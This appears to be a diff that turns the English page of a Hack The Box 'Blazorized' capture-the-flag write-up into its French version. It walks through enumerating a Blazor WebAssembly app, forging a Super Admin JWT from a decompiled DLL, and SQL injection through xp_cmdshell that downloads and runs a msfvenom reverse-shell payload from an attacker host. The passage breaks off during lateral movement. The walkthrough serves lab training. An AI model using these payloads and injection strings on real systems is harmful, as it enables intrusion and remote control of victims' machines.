@@ -1,15 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
     <head>
         <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
-<meta name="description" content="Platform: Hack The Box Link: Blazorized Level: Hard OS: Windows Blazorized features a variety of Active Directory attacks. We begin by examining a web server hosting a Blazor WebAssembly application with restricted content access. Through enumeration, we locate several DLL files associated with the application. Decompiling one of these files reveals sensitive information, which we leverage to forge a JSON Web Token (JWT). This grants us access to an admin panel where we identify a SQL injection vulnerability, providing our initial foothold." />
+<meta name="description" content="Platforme: Hack The Box Lien: Blazorized Niveau: Difficle OS: Windows Blazorized présente une variété d&amp;rsquo;attaques Active Directory. Nous commençons par examiner un serveur web hébergeant une application Blazor WebAssembly avec un accès restreint au contenu. Par le biais d&amp;rsquo;une énumération, nous trouvons plusieurs fichiers DLL associés à l&amp;rsquo;application. La décompilation d&amp;rsquo;un de ces fichiers révèle des informations sensibles, que nous utilisons pour forger un jeton Web JSON (JWT). Cela nous permet d&amp;rsquo;accéder à un panneau d&amp;rsquo;administration où nous identifions une vulnérabilité d&amp;rsquo;injection SQL, ce qui nous donne un accès initial." />
 <meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
-<link rel="canonical" href="https://scorpiosec.com/posts/2024/11/htb-blazorized/" />
+<link rel="canonical" href="https://scorpiosec.com/fr/posts/2024/11/htb-blazorized/" />
 
 
     <title>
@@ -37,20 +37,20 @@
 
 
 <meta itemprop="name" content="HTB: Blazorized">
-<meta itemprop="description" content="Platform: Hack The Box Link: Blazorized Level: Hard OS: Windows Blazorized features a variety of Active Directory attacks. We begin by examining a web server hosting a Blazor WebAssembly application with restricted content access. Through enumeration, we locate several DLL files associated with the application. Decompiling one of these files reveals sensitive information, which we leverage to forge a JSON Web Token (JWT). This grants us access to an admin panel where we identify a SQL injection vulnerability, providing our initial foothold."><meta itemprop="datePublished" content="2024-11-07T18:46:04-06:00" />
+<meta itemprop="description" content="Platforme: Hack The Box Lien: Blazorized Niveau: Difficle OS: Windows Blazorized présente une variété d&rsquo;attaques Active Directory. Nous commençons par examiner un serveur web hébergeant une application Blazor WebAssembly avec un accès restreint au contenu. Par le biais d&rsquo;une énumération, nous trouvons plusieurs fichiers DLL associés à l&rsquo;application. La décompilation d&rsquo;un de ces fichiers révèle des informations sensibles, que nous utilisons pour forger un jeton Web JSON (JWT). Cela nous permet d&rsquo;accéder à un panneau d&rsquo;administration où nous identifions une vulnérabilité d&rsquo;injection SQL, ce qui nous donne un accès initial."><meta itemprop="datePublished" content="2024-11-07T18:46:04-06:00" />
 <meta itemprop="dateModified" content="2024-11-07T18:46:04-06:00" />
-<meta itemprop="wordCount" content="2399"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Blazorized/Blazorized.png" />
+<meta itemprop="wordCount" content="2331"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Blazorized/Blazorized.png" />
 <meta itemprop="keywords" content="Hack The Box," />
 <meta name="twitter:card" content="summary_large_image" />
 <meta name="twitter:image" content="https://scorpiosec.com/images/HTB-Blazorized/Blazorized.png" /><meta name="twitter:title" content="HTB: Blazorized"/>
-<meta name="twitter:description" content="Platform: Hack The Box Link: Blazorized Level: Hard OS: Windows Blazorized features a variety of Active Directory attacks. We begin by examining a web server hosting a Blazor WebAssembly application with restricted content access. Through enumeration, we locate several DLL files associated with the application. Decompiling one of these files reveals sensitive information, which we leverage to forge a JSON Web Token (JWT). This grants us access to an admin panel where we identify a SQL injection vulnerability, providing our initial foothold."/>
+<meta name="twitter:description" content="Platforme: Hack The Box Lien: Blazorized Niveau: Difficle OS: Windows Blazorized présente une variété d&rsquo;attaques Active Directory. Nous commençons par examiner un serveur web hébergeant une application Blazor WebAssembly avec un accès restreint au contenu. Par le biais d&rsquo;une énumération, nous trouvons plusieurs fichiers DLL associés à l&rsquo;application. La décompilation d&rsquo;un de ces fichiers révèle des informations sensibles, que nous utilisons pour forger un jeton Web JSON (JWT). Cela nous permet d&rsquo;accéder à un panneau d&rsquo;administration où nous identifions une vulnérabilité d&rsquo;injection SQL, ce qui nous donne un accès initial."/>
 
 
 
     <meta property="og:title" content="HTB: Blazorized" />
-<meta property="og:description" content="Platform: Hack The Box Link: Blazorized Level: Hard OS: Windows Blazorized features a variety of Active Directory attacks. We begin by examining a web server hosting a Blazor WebAssembly application with restricted content access. Through enumeration, we locate several DLL files associated with the application. Decompiling one of these files reveals sensitive information, which we leverage to forge a JSON Web Token (JWT). This grants us access to an admin panel where we identify a SQL injection vulnerability, providing our initial foothold." />
+<meta property="og:description" content="Platforme: Hack The Box Lien: Blazorized Niveau: Difficle OS: Windows Blazorized présente une variété d&rsquo;attaques Active Directory. Nous commençons par examiner un serveur web hébergeant une application Blazor WebAssembly avec un accès restreint au contenu. Par le biais d&rsquo;une énumération, nous trouvons plusieurs fichiers DLL associés à l&rsquo;application. La décompilation d&rsquo;un de ces fichiers révèle des informations sensibles, que nous utilisons pour forger un jeton Web JSON (JWT). Cela nous permet d&rsquo;accéder à un panneau d&rsquo;administration où nous identifions une vulnérabilité d&rsquo;injection SQL, ce qui nous donne un accès initial." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://scorpiosec.com/posts/2024/11/htb-blazorized/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Blazorized/Blazorized.png" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://scorpiosec.com/fr/posts/2024/11/htb-blazorized/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Blazorized/Blazorized.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2024-11-07T18:46:04-06:00" />
 <meta property="article:modified_time" content="2024-11-07T18:46:04-06:00" />
 
@@ -115,14 +115,14 @@ if (!doNotTrack) {
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="https://scorpiosec.com/about/">About</a></li><li><a href="https://scorpiosec.com/posts/">Posts</a></li><li><a href="https://scorpiosec.com/projects/">Projects</a></li><li><a href="https://scorpiosec.com/tags/">Tags</a></li><li><a href="https://scorpiosec.com/categories/">Categories</a></li>
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/fr/about/">À propos</a></li><li><a href="https://scorpiosec.com/fr/posts/">Postes</a></li><li><a href="https://scorpiosec.com/fr/projects/">Projets</a></li><li><a href="https://scorpiosec.com/fr/tags/">Tags</a></li><li><a href="https://scorpiosec.com/fr/categories/">Categories</a></li>
         <div class="submenu">
             <li class="dropdown">
-                <a href="javascript:void(0)" class="dropbtn">en</a>
+                <a href="javascript:void(0)" class="dropbtn">fr</a>
                 <div class="dropdown-content">
                     
                         
-                            <a title="fr" href="https://scorpiosec.com/fr/posts/2024/11/htb-blazorized/">fr</a>
+                            <a title="en" href="https://scorpiosec.com/posts/2024/11/htb-blazorized/">en</a>
                         
                     
                 </div>
@@ -158,11 +158,11 @@ if (!doNotTrack) {
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        12 minutes
+        11 minutes
 
-         | Also available in
+         | Aussi disponible en
           
-              <a href="https://scorpiosec.com/fr/posts/2024/11/htb-blazorized/"><span class="flag fi fi-fr"></span></a>
+              <a href="https://scorpiosec.com/posts/2024/11/htb-blazorized/"><span class="flag fi fi-gb"></span></a>
           
         
       </p>
@@ -170,7 +170,7 @@ if (!doNotTrack) {
 
     <article>
       <h1 class="post-title">
-        <a href="https://scorpiosec.com/posts/2024/11/htb-blazorized/">HTB: Blazorized</a>
+        <a href="https://scorpiosec.com/fr/posts/2024/11/htb-blazorized/">HTB: Blazorized</a>
       </h1>
 
       
@@ -178,18 +178,18 @@ if (!doNotTrack) {
       
         <hr />
         <aside id="toc">
-          <div class="toc-title">Table of Contents</div>
+          <div class="toc-title">Table des matières</div>
           <nav id="TableOfContents">
   <ul>
-    <li><a href="#scanning">Scanning</a></li>
-    <li><a href="#enumeration">Enumeration</a></li>
-    <li><a href="#initial-foothold">Initial Foothold</a>
+    <li><a href="#balayage">Balayage</a></li>
+    <li><a href="#enumération">Enumération</a></li>
+    <li><a href="#accès-initial">Accès initial</a>
       <ul>
-        <li><a href="#lateral-movement-shell-as-rsa_4810">Lateral Movement (shell as RSA_4810)</a></li>
-        <li><a href="#lateral-movement-shell-as-ssa_6010">Lateral Movement (shell as SSA_6010)</a></li>
+        <li><a href="#mouvement-latéral-shell-en-tant-que-rsa_4810">Mouvement latéral (Shell en tant que RSA_4810)</a></li>
+        <li><a href="#mouvement-latéral-shell-en-tant-que-ssa_6010">Mouvement latéral (Shell en tant que SSA_6010)</a></li>
       </ul>
     </li>
-    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#elévation-de-privilèges">Elévation de Privilèges</a></li>
   </ul>
 </nav>
         </aside>
@@ -199,20 +199,20 @@ if (!doNotTrack) {
 
       <div class="post-content">
         <ul>
-<li>Platform: Hack The Box</li>
-<li>Link: <a href="https://app.hackthebox.com/machines/Blazorized" target="_blank" >Blazorized</a>
+<li>Platforme: Hack The Box</li>
+<li>Lien: <a href="https://app.hackthebox.com/machines/Blazorized" target="_blank" >Blazorized</a>
 
 </li>
-<li>Level: Hard</li>
+<li>Niveau: Difficle</li>
 <li>OS: Windows</li>
 </ul>
 <hr>
-<p>Blazorized features a variety of Active Directory attacks. We begin by examining a web server hosting a Blazor WebAssembly application with restricted content access. Through enumeration, we locate several DLL files associated with the application. Decompiling one of these files reveals sensitive information, which we leverage to forge a JSON Web Token (JWT). This grants us access to an admin panel where we identify a SQL injection vulnerability, providing our initial foothold.</p>
-<p>Upon running Bloodhound, we discover that the current user has the <code>WriteSPN</code> privilege, enabling a targeted Kerberoasting attack for lateral movement to another user. This second user has permissions to modify the <code>Script-Path</code> of yet another user, allowing further lateral movement. After a second Bloodhound run, we find that our final user is in a group with the <code>DCSync</code> privilege on the Domain Controller, which we use to launch a DCSync attack in order to obtain the administrator’s hash.</p>
-<p>Target IP address - <code>10.10.11.22</code></p>
-<h2 id="scanning">Scanning</h2>
+<p>Blazorized présente une variété d&rsquo;attaques Active Directory. Nous commençons par examiner un serveur web hébergeant une application Blazor WebAssembly avec un accès restreint au contenu. Par le biais d&rsquo;une énumération, nous trouvons plusieurs fichiers DLL associés à l&rsquo;application. La décompilation d&rsquo;un de ces fichiers révèle des informations sensibles, que nous utilisons pour forger un jeton Web JSON (JWT). Cela nous permet d&rsquo;accéder à un panneau d&rsquo;administration où nous identifions une vulnérabilité d&rsquo;injection SQL, ce qui nous donne un accès initial.</p>
+<p>En exécutant Bloodhound, nous découvrons que l&rsquo;utilisateur actuel a le privilège <code>WriteSPN</code>, permettant une attaque Kerberoast ciblée pour un déplacement latéral vers un autre utilisateur. Ce second utilisateur a le droit de modifier le <code>Script-Path</code> d&rsquo;un autre utilisateur, droit que nous utilisons pour effectuer un autre déplacement latéral. Après une deuxième exécution de Bloodhound, nous découvrons que le dernier utilisateur fait partie d&rsquo;un groupe disposant du privilège <code>DCSync</code> sur le contrôleur de domaine, ouvrant ainsi la voie à une attaque DCSync pour obtenir le hachage de l&rsquo;administrateur.</p>
+<p>Adresse IP cible - <code>10.10.11.22</code></p>
+<h2 id="balayage">Balayage</h2>
 <pre tabindex="0"><code>./nmap_scan.sh 10.10.11.22 Blazorized
-</code></pre><p><strong>Results</strong></p>
+</code></pre><p><strong>Résultats</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49678,49683,49708,49776
 </span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-11-07 18:52 CST
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.22
@@ -310,61 +310,57 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 73.71 seconds
-</span></span></code></pre></div><p>From the nmap output we find several things:</p>
+</span></span></code></pre></div><p>Le scan nmap nous donne quelques informations:</p>
 <ul>
-<li>We are dealing with a domain controller (the domain name is <code>blazorized.htb</code>).</li>
-<li>There is a web server with a redirection to <code>http://blazorized.htb</code>.</li>
-<li>The target is running MSSQL on port <code>1433</code>.</li>
+<li>La cible est un contrôleur de domaine (le nom de domaine est <code>blazorized.htb</code>).</li>
+<li>Il y a un serveur web avec une redirection vers <code>http://blazorized.htb</code>.</li>
+<li>La base de données utilisée est MSSQL sur le port <code>1433</code>.</li>
 </ul>
-<h2 id="enumeration">Enumeration</h2>
-<p>Before checking the web server we do some SMB enumeration, but both netexec and enum4linux fail.</p>
+<h2 id="enumération">Enumération</h2>
+<p>Avant de vérifier le serveur web, nous procédons à une énumération SMB, mais nos tentatives avec netexec et enum4linux échouent.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/netexec_smb_enum.png" alt="netexec smb enumeration"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/enum4linux_smb.png" alt="enum4linux smb enumeration"></p>
-<p>At <code>http://blazorized.htb/</code> we find a personal website built with Blazor Web Assembly.</p>
+<p>À <code>http://blazorized.htb/</code> nous trouvons un site web construit avec Blazor Web Assembly.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/Blazorized_website.png" alt="Blazorized website"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/Blazorized_tech_stack.png" alt="Blazorized wappalyzer"></p>
-<p>When we select the other sections such as <code>Interesting Digital Gardens</code> and <code>Misc. Links</code> we get the message <code>Failed fetching data from the API of Blazorized</code>.</p>
+<p>Lorsque nous sélectionnons les autres sections telles que <code>Interesting Digital Gardens</code> et <code>Misc. Links</code>, nous obtenons le message <code>Failed fetching data from the API of Blazorized</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/failed_fetching.png" alt="Blazorized failed data fetching"></p>
-<p>In the <code>Check for Updates</code> section we learn that only the super admin can check the content. Although we are invited to use the button provided, clicking it only provides the message <code>Failed to Update Blazorized's Content!</code>.</p>
+<p>Dans la section <code>Check for Updates</code> nous apprenons que seul le super administrateur peut accéder au contenu.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/check_updates.png" alt="Blazorized check updates"></p>
-<p>We continue our enumeration with some directory brute forcing but it is unfruitful.</p>
+<p>Nous continuons notre énumération et essayons de trouver des répertoires cachés, mais sans succès.</p>
 <pre tabindex="0"><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://blazorized.htb
-</code></pre><p>With subdomain enumeration we discover <code>admin</code>.</p>
+</code></pre><p>En revanche, l&rsquo;énumération des sous-domaines nous permet de découvrir <code>admin</code>.</p>
 <pre tabindex="0"><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://blazorized.htb -H &#34;Host: FUZZ.blazorized.htb&#34; -ic -fs 144
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Blazorized/subdomain_enum.png" alt="subdomain enumeration"></p>
-<p>At <code>http://admin.blazorized.htb/</code> we find the super admin login page.</p>
+<p>À <code>http://admin.blazorized.htb/</code> nous trouvons la page de connexion du super administrateur.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/super_admin_login.png" alt="super admin login"></p>
-<p>When dealing with an application using a tech stack we are not familiar with, it is always a good thing to read the documentation. On this <a href="https://github.com/dotnet/AspNetCore.Docs/blob/main/aspnetcore/blazor/project-structure.md#location-of-the-blazor-script" target="_blank" >Github page</a>
+<p>Je ne connais pas très bien les applications Blazor WebAssembly, je consulte donc la documentation pour en savoir plus sur leur structure. Sur ce <a href="%28https://github.com/dotnet/AspNetCore.Docs/blob/main/aspnetcore/blazor/project-structure.md#location-of-the-blazor-script%29" >compte Github</a>
 
- we learn that a Blazor application always need a Blazor script which is a critical file for the functioning on the app.</p>
-<p>We also read that Blazor web applications use json files.</p>
+, nous apprenons que les applications Blazor ont toujours besoin d&rsquo;un script Blazor qui est essentiel au fonctionnement de l&rsquo;application. De plus, elles utilisent également des fichiers json.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/Blazor_script.png" alt="Blazor script location"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/blazor_json_files.png" alt="Blazor json files"></p>
-<p>We bring up the developer tools (with the <code>F12</code> key) and find <code>_framework/blazor.webassembly.js</code>.</p>
+<p>Nous ouvrons les <code>Developers Tools</code> (avec la touche <code>F12</code>) et trouvons <code>_framework/blazor.webassembly.js</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/blazor_script_found.png" alt="Blazor script found in Blazorized"></p>
-<p>After opening it we find some code that is not well formatted, we use <a href="https://beautifier.io/" target="_blank" >beautifier.io</a>
+<p>Dans le fichier, nous trouvons du code qui n&rsquo;est pas bien formaté, nous utilisons <a href="https://beautifier.io/" target="_blank" >beautifier.io</a>
 
- to make it more readable.</p>
+ pour le rendre plus lisible.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/js_file_beautified.png" alt="Blazor script beautified"></p>
-<blockquote>
-<p>I was overwhelmed by the amount of JavaScript code in front of me, and due to my inexperience with Blazor WebAssembly, I didn’t know what to look for. In hindsight, I should have focused more on the <code>_framework</code> directory, which holds the essential application files. It would have helped me find the exploitation path quicker.</p>
-</blockquote>
-<p>We get a lot of JavaScript code but nothing really stands out. Let&rsquo;s move to Burp Suite, we will use the <code>Blazor Traffic Processor</code> extension to help with our enumeration.</p>
+<p>Nous obtenons beaucoup de code JavaScript mais rien de particulier. Continuons avec Burp Suite, nous utilisons l&rsquo;extension <code>Blazor Traffic Processor</code> pour aider notre énumération.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/BTP_extension.png" alt="BTP extension"></p>
-<p>Burp picks up a lot of dll files under <code>_framework</code>. We can download any of them by going to <code>http://blazorized.htb/_framework/xxx.dll</code> (example: <code>blazorized.htb/_framework/Markdig.dll</code>), but doing it manually will surely be tedious.</p>
+<p>Burp trouve un grand nombre de fichiers dll sous <code>_framework</code>. Nous pouvons télécharger n&rsquo;importe lequel d&rsquo;entre eux en allant sur <code>http://blazorized.htb/_framework/xxx.dll</code> (exemple : <code>blazorized.htb/_framework/Markdig.dll</code>), mais le faire manuellement sera certainement fastidieux.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/dll_files_found.png" alt="DLL files found"></p>
-<p>At the bottom of the DLL file list in Burp, we find a file called <code>blazor.boot.json</code>. This file serves as a reference for all the DLL files that need to be loaded for the application to function correctly.</p>
+<p>Au bas de la liste des fichiers DLL dans Burp, nous trouvons un fichier appelé <code>blazor.boot.json</code>. Ce fichier sert de référence pour tous les fichiers DLL qui doivent être téléchargés pour que l&rsquo;application fonctionne correctement.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/blazor_boot_json.png" alt="blazor boot json"></p>
-<p>Going to <code>http://blazorized.htb/_framework/blazor.boot.json</code> does indeed bring up the same list of DLL files under <code>assembly</code> plus another file called <code>Blazorized.Helpers.dll</code> which we were not seeing in Burp.</p>
+<p>En allant sur <code>http://blazorized.htb/_framework/blazor.boot.json</code>, on retrouve effectivement la même liste de fichiers DLL sous <code>assembly</code> plus un autre fichier appelé <code>Blazorized.Helpers.dll</code> qui ne figurait pas dans Burp.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/DLL_files.png" alt="DLL files list"></p>
-<p>Further research revealed that it is not unusual for Blazor WebAssembly applications to expose their DLL files; in fact, this is part of how Blazor WebAssembly works.</p>
-<p>These applications are unique in that they run client-side in the browser through WebAssembly. To execute .NET code in the browser:</p>
+<p>Des recherches supplémentaires nous apprennent qu&rsquo;il n&rsquo;est pas rare que les applications Blazor WebAssembly exposent leurs fichiers DLL ; en réalité, cela fait partie du fonctionnement de Blazor WebAssembly.</p>
+<p>La particularité de ces applications est qu&rsquo;elles s&rsquo;exécutent côté client dans le navigateur grâce à WebAssembly. Pour exécuter le code .NET dans le navigateur:</p>
 <ol>
-<li>The browser must download the DLL files, including application code and dependencies.</li>
-<li>The WebAssembly runtime provided by Blazor loads and runs these DLLs on the client.</li>
+<li>Le navigateur doit télécharger les fichiers DLL, y compris le code de l&rsquo;application et les dépendances.</li>
+<li>Le moteur d&rsquo;exécution WebAssembly fourni par Blazor exécute ces DLL sur le client.</li>
 </ol>
-<p>However, it is up to the developers of these applications to ensure that no <strong>sensitive data or critical business logic</strong> is included in the client-side DLL files.</p>
-<p>Let&rsquo;s download the files and try to find something exploitable, we will use the python script below.</p>
+<p>Toutefois, il incombe aux développeurs de ces applications de s&rsquo;assurer qu&rsquo;aucune <strong>donnée sensible</strong> n&rsquo;est incluse dans les fichiers DLL côté client.</p>
+<p>Nous téléchargeons les fichiers et essayons de trouver quelque chose d&rsquo;exploitable, nous utiliserons le script python ci-dessous.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
@@ -399,25 +395,22 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>        download_dll(dll_name, dll_hash)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Download complete.&#34;</span>)
-</span></span></code></pre></div><p>Let&rsquo;s use <a href="https://www.decompiler.com/" target="_blank" >decompiler.com</a>
+</span></span></code></pre></div><p>Utilisons <a href="https://www.decompiler.com/" target="_blank" >decompiler.com</a>
 
- to decompile our DLL files (you can also use DNSpy on Windows).</p>
-<blockquote>
-<p>I went through a TON of decompilations that turned out to be useless so I&rsquo;m going to skip to the right one.</p>
-</blockquote>
-<p>Decompile <code>Blazorized.Helpers.dll</code> and go to <code>Blazorized.Helpers</code> &ndash;&gt; <code>JWT.cs</code>. Here we find everything that is needed to create a Super Admin JWT token. We will use <a href="https://jwt.io/" target="_blank" >jwt.io</a>
+ pour décompiler nos fichiers DLL (vous pouvez aussi utiliser DNSpy sous Windows).</p>
+<p>Décompilez <code>Blazorized.Helpers.dll</code> et allez à <code>Blazorized.Helpers</code> &ndash;&gt; <code>JWT.cs</code>. Nous y trouvons tout ce qui est nécessaire pour créer un JWT (JSON Web Token) Super Admin. Nous utilisons <a href="https://jwt.io/" target="_blank" >jwt.io</a>
 
- to generate it.</p>
+ pour cette tâche.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/JWT_info.png" alt="JWT info"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/JWT_info2.png" alt="JWT info2"></p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/JWT_info3.png" alt="JWT info3"></p>
-<p>Below is all the information we need:</p>
-<pre tabindex="0"><code># For the Header (make sure to change the algorithm to 512 at the top of the page)
+<p>Vous trouverez ci-dessous toutes les informations dont nous avons besoin:</p>
+<pre tabindex="0"><code># Pour le Header (make sure to change the algorithm to 512 at the top of the page)
 
 &#34;alg&#34;: 512
 &#34;typ&#34;: &#34;JWT&#34;
 
-# For the payload
+# Pour le payload
 
 &#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&#34;: &#34;superadmin@blazorized.htb&#34;
 &#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&#34;: &#34;Super_Admin&#34;
@@ -425,124 +418,124 @@ if (!doNotTrack) {
 &#34;aud&#34;: &#34;http://admin.blazorized.htb&#34;
 &#34;exp&#34;: &#34;xxxxxxxxxxx&#34; 
 
-# In the VERIFY SIGNATURE section just paste the value of jwtSymmetricSecurityKey
+# Pour la section VERIFY SIGNATURE, il suffit d&#39;utiliser la valeur de jwtSymmetricSecurityKey
 </code></pre><blockquote>
-<p>Do not use the <code>exp</code> value in the screenshot, it won&rsquo;t be valid anymore by the time you read this write up. Instead use <a href="https://www.epochconverter.com/" target="_blank" >EpochConverter</a>
+<p>N&rsquo;utilisez pas la valeur <code>exp</code> dans la capture d&rsquo;écran, elle ne sera plus valide au moment où vous lirez cet article. Utilisez plutôt <a href="https://www.epochconverter.com/" target="_blank" >EpochConverter</a>
 
- to generate a valid value. If the current time exceeds the <code>exp</code> timestamp, the token will be rejected as expired. (A good value to use is your current day at 11:59 PM, provided that it is not past that time yet).</p>
+ pour générer une valeur valide. Si l&rsquo;heure actuelle dépasse l&rsquo;horodatage <code>exp</code>, le jeton sera rejeté comme étant expiré.</p>
 </blockquote>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/jwt_value.png" alt="JWT value"></p>
-<p>Once you have your encoded value go to <code>http://admin.blazorized.htb/</code>, open the dev tools with <code>F12</code>, go to <code>Storage</code> &ndash;&gt; <code>Local Storage</code> and add your token with</p>
+<p>Une fois que vous avez votre valeur encodée, allez à <code>http://admin.blazorized.htb/</code>, ouvrez les outils de développement avec <code>F12</code>, puis dans<code>Storage</code> &ndash;&gt; <code>Local Storage</code> et ajoutez votre token avec</p>
 <pre tabindex="0"><code>key = jwt
 Value = YOUR_ENCODED_JWT
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Blazorized/jwt_local_storage.png" alt="JWT local storage"></p>
-<p>After refreshing the page we access the Super Admin Panel.</p>
+<p>Après avoir actualisé la page, nous accédons au tableau de bord du super administrateur.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/super_admin-panel.png" alt="Super Admin Panel"></p>
-<h2 id="initial-foothold">Initial Foothold</h2>
-<p>In the <code>Check Duplicate Post Titles</code> section we find a feature that is most likely using the datbase (MSSQL), we will use this and try to get a reverse shell via SQL injections.</p>
+<h2 id="accès-initial">Accès initial</h2>
+<p>Dans la section <code>Check Duplicate Post Titles</code> nous trouvons une fonctionnalité qui utilise très probablement la base de données (MSSQL), nous nous en servons et essayons d&rsquo;obtenir un reverse shell via des injections SQL.</p>
 <ol>
-<li>We start by creating a malicious <code>exe</code> file.</li>
+<li>Nous commençons par créer un fichier <code>exe</code> malveillant.</li>
 </ol>
 <pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT -f exe -o shell.exe
 </code></pre><ol start="2">
-<li>After setting up a web server, we drop the file on the target system.</li>
+<li>Après avoir mis en place un serveur web, nous transférons le fichier sur le système cible.</li>
 </ol>
 <pre tabindex="0"><code>&#39;; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;) = 1 EXEC master.dbo.xp_cmdshell &#39;powershell -c &#34;curl http://YOUR_IP:WEBSERVER_PORT/shell.exe -o %TEMP%\shell.exe&#34; --
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Blazorized/revshell1.png" alt="malicious file dropped on target"></p>
 <ol start="3">
 <li>
-<p>We start a listener in Metasploit via <code>exploit/multi/handler</code>.</p>
+<p>Nous démarrons un listener dans Metasploit via <code>exploit/multi/handler</code>.</p>
 </li>
 <li>
-<p>We execute the malicous <code>exe</code> file on the target and obtain a meterpreter shell as <code>NU_1055</code>.</p>
+<p>Nous exécutons le fichier malicieux <code>exe</code> sur la cible et obtenons un shell meterpreter en tant que <code>NU_1055</code>.</p>
 </li>
 </ol>
 <pre tabindex="0"><code>&#39;; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;) = 1 EXEC master.dbo.xp_cmdshell &#39; %TEMP%\shell.exe --
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Blazorized/foothold.png" alt="Meterpreter shell foothold"></p>
-<p>We find the user flag in the user Desktop.</p>
+<p>Nous trouvons le drapeau utilisateur sur le bureau.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Blazorized/user_flag.png" alt="user flag"></p>
-<h3 id="lateral-movement-shell-as-rsa_4810">Lateral Movement (shell as RSA_4810)</h3>
-<p>Usually we would run Bloodhound with some credentials in order to gather all the data about the domain. When we do not have access to any credentials we can use <a href="https://github.com/BloodHoundAD/SharpHound" target="_blank" >SharpHound</a>
+<h3 id="mouvement-latéral-shell-en-tant-que-rsa_4810">Mouvement latéral (Shell en tant que RSA_4810)</h3>
+<p>Habituellement, nous utilisons Bloodhound avec des identifiants afin de rassembler toutes les données relatives au domaine. Lorsque nous n&rsquo;avons pas accès à des informations d&rsquo;identification, nous pouvons utiliser <a href="https://github.com/BloodHoundAD/SharpHound" target="_blank" >SharpHound</a>
 
- to obtain that information.</p>
+ pour effectuer l&rsquo;énumération du domaine.</p>
 <pre tabindex="0"><code>certutil.exe -urlcache -split -f http://YOUR_IP:WEBSERVER_PORT/SharpHound.exe sharphound.exe
 </code></pre><p><img src="https://scorpiosec.com/images/HTB-Blazorized/download_sharphound.png" alt="SharpHound transfer"></p>
